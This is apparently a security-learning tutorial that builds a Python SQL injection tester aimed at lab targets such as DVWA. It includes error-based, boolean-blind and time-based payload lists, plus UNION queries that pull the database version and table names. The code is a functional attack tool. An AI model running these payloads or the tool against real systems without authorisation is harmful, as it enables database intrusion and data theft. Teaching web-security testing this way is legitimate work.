SQLi Parameter Tester

Automate SQL injection testing — detect vulnerable parameters, test blind/time-based SQLi, and extract database info.

pythonsqlweb-securitysqli

Learning Objectives

  • Understand SQL injection types: error-based, blind boolean, blind time-based, and UNION-based
  • Automate parameter discovery and injection testing with Python's requests library
  • Implement response analysis to differentiate vulnerable from non-vulnerable parameters
  • Enumerate database structure — table names, column names — through injection
  • Learn how professional tools like sqlmap work under the hood

Prerequisites

  • Python 3.8+ with requests installed
  • Basic SQL knowledge (SELECT, UNION, WHERE clauses)
  • Understanding of HTTP GET/POST parameters
  • A vulnerable test target: DVWA, SQLi Labs, or bWAPP
⚠ Ethics & Legal

Only test against applications you own or have explicit permission to test. SQL injection against production systems is illegal. Use dedicated vulnerable apps like SQLi Labs or DVWA.

Step 1: Parameter Discovery & Payload Injection Engine

Build the core engine that discovers injectable parameters and sends test payloads. We'll support both GET query strings and POST form data.

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SQLiTester:
    def __init__(self, target_url, method='GET'):
        self.url = target_url
        self.method = method.upper()
        self.session = requests.Session()
        self.baseline = None  # response without payload

    def get_baseline(self):
        """Get the normal response for comparison."""
        try:
            if self.method == 'GET':
                self.baseline = self.session.get(self.url, timeout=10)
            else:
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query)
                form_data = self._extract_form_params()
                self.baseline = self.session.post(self.url, data=form_data, timeout=10)
            return True
        except requests.RequestException as e:
            print(f"Failed to establish baseline: {e}")
            return False

    def _extract_form_params(self):
        from bs4 import BeautifulSoup
        r = self.session.get(self.url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        params = {}
        for inp in soup.find_all('input'):
            name = inp.get('name')
            if name:
                params[name] = inp.get('value', 'test')
        return params

    def inject_get_param(self, param, payload):
        """Inject payload into a GET parameter."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        return self.session.get(test_url, timeout=10)

    def inject_post_param(self, param, payload, form_data):
        """Inject payload into a POST parameter."""
        data = dict(form_data)
        data[param] = payload
        return self.session.post(self.url, data=data, timeout=10)

Why a session? requests.Session() preserves cookies across requests — essential when the target uses session-based authentication or CSRF tokens that change per request.

Step 2: Error-Based Detection

The fastest and most reliable detection method: inject payloads that break SQL syntax and check for database error messages in the response.

import re

ERROR_SIGNATURES = {
    'MySQL': [r"SQL syntax.*MySQL", r"mysql_fetch", r"MySQL.*error",
              r"Warning.*mysql_", r"valid MySQL result"],
    'PostgreSQL': [r"PostgreSQL.*ERROR", r"Warning.*\\Wpg_", r"valid PostgreSQL"],
    'SQLite': [r"SQLite.*error", r"SQLite/JDBCDriver"],
    'MSSQL': [r"Microsoft OLE DB.*SQL Server", r"ODBC.*Driver.*SQL Server",
              r"Incorrect syntax near", r"Unclosed quotation mark"],
    'Oracle': [r"ORA-\d{5}", r"Oracle.*Driver", r"Oracle.*error"],
}

ERROR_PAYLOADS = [
    "'",        # Single quote breaks string
    "\"",        # Double quote breaks string
    "'--",       # Single quote with comment
    "')--",      # Close paren + comment
    "' OR '1'='1", # Tautology (often changes response)
    "1' AND '1'='2", # False condition
]

class ErrorBasedDetector:
    def detect(self, tester, param):
        for payload in ERROR_PAYLOADS:
            try:
                response = tester.inject_get_param(param, payload)
                body = response.text

                for db, patterns in ERROR_SIGNATURES.items():
                    for pattern in patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            return {
                                'method': 'error_based',
                                'parameter': param,
                                'payload': payload,
                                'database': db,
                                'confidence': 'high',
                            }
            except:
                continue
        return None

Step 3: Blind Boolean-Based Detection

When error messages are suppressed, use boolean logic — inject AND/OR conditions that change the response in predictable ways.

class BooleanBlindDetector:
    """Detect SQLi by comparing responses to TRUE vs FALSE conditions."""

    def detect(self, tester, param):
        true_payload = f"{param}=1' AND '1'='1"
        false_payload = f"{param}=1' AND '1'='2"

        try:
            true_resp = tester.inject_get_param(param, "1' AND '1'='1")
            false_resp = tester.inject_get_param(param, "1' AND '1'='2")

            # Compare response length
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)
            baseline_len = len(tester.baseline.text) if tester.baseline else 0

            # If FALSE condition produces different response from TRUE,
            # the injection is likely working
            if abs(true_len - false_len) > 50 or true_resp.status_code != false_resp.status_code:
                return {
                    'method': 'blind_boolean',
                    'parameter': param,
                    'true_response_length': true_len,
                    'false_response_length': false_len,
                    'status_diff': true_resp.status_code != false_resp.status_code,
                    'confidence': 'medium',
                }
        except:
            pass
        return None

Step 4: Time-Based Blind Detection

The nuclear option — when all output is hidden, use SLEEP/BENCHMARK to cause measurable time delays.

import time

TIME_PAYLOADS = {
    'MySQL': [
        "1' AND SLEEP(5)--",
        "1' AND BENCHMARK(5000000,MD5('a'))--",
        "1' AND IF(1=1,SLEEP(5),0)--",
    ],
    'PostgreSQL': ["1' AND pg_sleep(5)--"],
    'MSSQL': ["1'; WAITFOR DELAY '00:00:05'--"],
    'Oracle': ["1' AND DBMS_LOCK.SLEEP(5)--"],
}

class TimeBasedDetector:
    def __init__(self, threshold=4.0):
        self.threshold = threshold  # seconds to consider "delayed"

    def detect(self, tester, param):
        # First establish average response time
        avg_time = self._get_baseline_timing(tester, param)

        for db, payloads in TIME_PAYLOADS.items():
            for payload in payloads:
                try:
                    start = time.time()
                    tester.inject_get_param(param, payload)
                    elapsed = time.time() - start

                    if elapsed > self.threshold:
                        return {
                            'method': 'time_based',
                            'parameter': param,
                            'payload': payload,
                            'database': db,
                            'response_time': round(elapsed, 2),
                            'baseline_time': round(avg_time, 2),
                            'confidence': 'high',
                        }
                except requests.Timeout:
                    return {
                        'method': 'time_based',
                        'parameter': param,
                        'payload': payload,
                        'database': db,
                        'response_time': '>timeout',
                        'confidence': 'high',
                    }
                except:
                    continue
        return None

    def _get_baseline_timing(self, tester, param):
        times = []
        for _ in range(3):
            try:
                start = time.time()
                tester.inject_get_param(param, 'normal')
                times.append(time.time() - start)
            except:
                pass
        return sum(times) / len(times) if times else 1.0

Step 5: Data Extraction & CLI

Now put it all together — once a parameter is confirmed vulnerable, extract database metadata via UNION injection.

UNION_PROBES = [
    # Determine number of columns
    ("1' ORDER BY {n}--", 'column_count'),
    # UNION-based extraction
    ("1' UNION SELECT {cols}--", 'union_select'),
    # Database version
    ("1' UNION SELECT @@version,{nulls}--", 'db_version'),
    # Table enumeration (MySQL)
    ("1' UNION SELECT table_name,{nulls} FROM information_schema.tables WHERE table_schema=database()--", 'tables'),
]

def extract_data(tester, param, columns=5):
    """Try UNION-based data extraction."""
    results = {}

    # First, find column count
    for n in range(1, 16):
        try:
            resp = tester.inject_get_param(param, f"1' ORDER BY {n}--")
            if tester.baseline and len(resp.text) != len(tester.baseline.text):
                columns = n - 1
                results['column_count'] = columns
                break
        except:
            continue

    # Try to extract version
    nulls = ','.join(['NULL'] * (columns - 1))
    try:
        payload = f"1' UNION SELECT @@version,{nulls}--"
        resp = tester.inject_get_param(param, payload)
        results['version_raw'] = resp.text[:500]
    except:
        pass

    return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="SQLi Parameter Tester")
    parser.add_argument("url", help="Target URL with parameters")
    parser.add_argument("-p", "--param", help="Specific parameter to test")
    parser.add_argument("--post", action="store_true", help="Use POST method")
    parser.add_argument("--extract", action="store_true", help="Attempt data extraction")
    args = parser.parse_args()

    tester = SQLiTester(args.url, 'POST' if args.post else 'GET')
    if not tester.get_baseline():
        return

    params = [args.param] if args.param else list(parse_qs(urlparse(args.url).query).keys())
    detectors = [ErrorBasedDetector(), BooleanBlindDetector(), TimeBasedDetector()]

    for param in params:
        print(f"\n[*] Testing parameter: {param}")
        for detector in detectors:
            result = detector.detect(tester, param)
            if result:
                print(f"  [+] {result['method']}: {result.get('database','?')} "
                      f"(confidence: {result.get('confidence','?')})")
                if args.extract and result.get('confidence') == 'high':
                    data = extract_data(tester, param)
                    print(f"  [*] Extracted: {data}")

if __name__ == "__main__":
    main()
